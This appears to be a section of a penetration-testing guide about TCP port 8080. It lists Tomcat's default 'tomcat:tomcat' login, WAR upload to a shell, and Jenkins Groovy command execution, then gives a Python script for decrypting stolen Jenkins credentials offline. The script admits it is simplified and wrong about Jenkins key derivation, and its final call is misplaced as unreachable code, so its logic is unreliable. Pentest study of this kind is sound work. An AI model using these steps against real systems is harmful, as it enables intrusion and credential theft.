## Overview

Port **8080 (TCP)** is the most common **alternative HTTP port** — used for web proxies, application servers, development environments, management consoles, and API gateways. Unlike port 80 (which typically serves the primary website), port 8080 often hosts **administrative interfaces, backend services, and infrastructure management tools** — many with default credentials, exposed consoles, or known deserialization vulnerabilities.

::callout{icon="i-lucide-skull" color="red"}
Port 8080 is where **infrastructure meets the web**. Apache Tomcat manager, Jenkins script consoles, JBoss admin, Kubernetes dashboards, Weblogic T3, open HTTP proxies — all commonly found here. These services frequently run with **default credentials**, **unauthenticated admin panels**, or **known RCE vulnerabilities**. A single Tomcat `/manager` with `tomcat:tomcat` credentials gives you a **WAR file upload → full shell**. A Jenkins `/script` console gives you **Groovy → OS command execution**. This port is a pentest goldmine.

  #!/usr/bin/env python3
  """Decrypt Jenkins credentials offline."""

  import re
  import sys
  from hashlib import sha256
  from Crypto.Cipher import AES

  def decrypt_secret(master_key_file, secret_file, encrypted):
      """Decrypt a Jenkins secret given master.key and hudson.util.Secret"""
      
      with open(master_key_file, 'r') as f:
          master_key = f.read().strip()
      
      with open(secret_file, 'rb') as f:
          hudson_secret = f.read()
      
      # Derive key
      key = sha256(master_key.encode()).digest()[:16]
      
      # Decrypt hudson.util.Secret
      cipher = AES.new(key, AES.MODE_ECB)
      secret = cipher.decrypt(hudson_secret)
      
      # Use decrypted secret to decrypt the credential
      # (simplified — actual Jenkins uses more complex key derivation)
      
      import base64
      encrypted_bytes = base64.b64decode(encrypted)
      
      # Try AES-128-CBC (Jenkins 2.x format)
      if len(encrypted_bytes) > 32:
          iv = encrypted_bytes[1:17]
          ciphertext = encrypted_bytes[17:]
          key2 = secret[:16]
          cipher2 = AES.new(key2, AES.MODE_CBC, iv)
          plaintext = cipher2.decrypt(ciphertext)
          # Remove PKCS7 padding
          pad_len = plaintext[-1]
          plaintext = plaintext[:-pad_len]
          return plaintext.decode('utf-8', errors='replace')
      
      return "Decryption failed — format not recognized"

      result = decrypt_secret(sys.argv[1], sys.argv[2], sys.argv[3])
